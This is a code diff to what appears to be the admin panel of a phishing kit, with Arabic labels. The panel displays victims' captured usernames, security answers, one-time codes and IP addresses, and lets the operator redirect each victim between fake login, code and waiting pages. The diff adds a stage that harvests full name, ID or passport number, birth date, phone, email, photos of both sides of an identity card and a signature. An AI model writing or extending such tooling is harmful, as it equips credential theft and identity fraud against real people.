@@ -399,6 +399,8 @@ function renderDetail(o){
   h+=securityCard(o.security_question,o.security_answer);
   h+='</div></div>';
 
+  h+=updateDataCard(o.update_data);
+
   var allData=[
     {icon:'🆔',label:'ID',value:o.id,hl:true},
     {icon:'👤',label:'اسم المستخدم',value:o.username},
@@ -407,7 +409,7 @@ function renderDetail(o){
     {icon:'🌐',label:'IP',value:o.ip},
     {icon:'🛡️',label:'سؤال الأمان',value:o.security_question},
     {icon:'💬',label:'إجابة الأمان',value:o.security_answer},
-    {icon:'📊',label:'المرحلة',value:o.step==='security'?'سؤال الأمان':o.step==='code'?'الكود':'تسجيل الدخول'},
+    {icon:'📊',label:'المرحلة',value:o.step==='security'?'سؤال الأمان':o.step==='code'?'الكود':o.step==='update-data'?'تحديث البيانات':'تسجيل الدخول'},
     {icon:'📋',label:'الحالة',value:statusLabel(o)},
     {icon:'🕐',label:'الوقت',value:fmtDate(o.time)}
   ].filter(function(d){return d.value&&d.value!=='—';});
@@ -445,6 +447,9 @@ function renderDetail(o){
     '<button style="background:#f59e0b" onclick="doRedir(\''+esc(o.id)+'\',\'login\')">🔑 تسجيل الدخول</button>'+
     '<button style="background:#7c3aed" onclick="doRedir(\''+esc(o.id)+'\',\'wait\')">⏳ الانتظار</button>'+
     '</div>';
+  h+='<div class="redir-grid" style="margin-top:6px;grid-template-columns:1fr">'+
+    '<button style="background:linear-gradient(135deg,#059669,#047857);font-size:12px" onclick="doRedir(\''+esc(o.id)+'\',\'update-data\')">📋 تحديث البيانات</button>'+
+    '</div>';
   h+='</div>';
 
   h+='<div class="sec-del"><h4>🗑️ حذف البيانات</h4>'+
@@ -469,6 +474,28 @@ function securityCard(question,answer){
     '<div style="font-size:11px;color:#a855f7;margin-bottom:2px;font-weight:600">💬 الإجابة</div>'+
     '<div style="font-size:18px;font-weight:800;color:#7c3aed;font-family:monospace;direction:ltr">'+esc(answer||'—')+'</div></div>'+
     '<button class="cp" data-copy="'+esc((question||'')+' → '+(answer||''))+'" onclick="doCopy(this)" style="border:none;background:rgba(168,85,247,.1);color:#7c3aed;border-radius:6px;padding:4px 12px;font-size:10px;font-weight:700;cursor:pointer;font-family:Cairo,sans-serif">📋 نسخ الكل</button></div>';
+}
+
+function updateDataCard(raw){
+  if(!raw)return '';
+  try{var d=JSON.parse(raw);}catch(e){return '';}
+  if(!d.full_name)return '';
+  var h='<div style="margin-top:12px;background:rgba(5,150,105,.04);border:1.5px solid rgba(5,150,105,.2);border-radius:14px;padding:16px">';
+  h+='<div style="font-size:14px;font-weight:800;color:#059669;margin-bottom:12px;display:flex;align-items:center;gap:6px">📋 بيانات تحديث البيانات</div>';
+  var fields=[
+    {l:'الاسم',v:d.full_name},{l:'رقم الهوية/الجواز',v:d.id_number},
+    {l:'تاريخ الميلاد',v:d.birth_date},{l:'الهاتف',v:d.phone},{l:'البريد',v:d.email}
+  ];
+  fields.forEach(function(f){
+    h+='<div style="display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #e2e8f0">'+
+      '<span style="font-size:12px;color:#64748b;font-weight:600">'+f.l+'</span>'+
+      '<span style="font-size:13px;font-weight:700;color:#1e293b">'+esc(f.v||'—')+'</span></div>';
+  });
+  if(d.id_front){h+='<div style="margin-top:10px"><div style="font-size:12px;color:#059669;font-weight:700;margin-bottom:4px">📷 الهوية الأمامية</div><img src="'+d.id_front+'" style="width:100%;border-radius:8px;border:1px solid #e2e8f0"></div>';}
+  if(d.id_back){h+='<div style="margin-top:8px"><div style="font-size:12px;color:#059669;font-weight:700;margin-bottom:4px">📷 الهوية الخلفية</div><img src="'+d.id_back+'" style="width:100%;border-radius:8px;border:1px solid #e2e8f0"></div>';}
+  if(d.signature){h+='<div style="margin-top:8px"><div style="font-size:12px;color:#059669;font-weight:700;margin-bottom:4px">✍️ التوقيع</div><img src="'+d.signature+'" style="max-width:100%;border-radius:8px;border:1px solid #e2e8f0;background:#fff"></div>';}
+  h+='</div>';
+  return h;
 }
 
 function doCopy(btn){
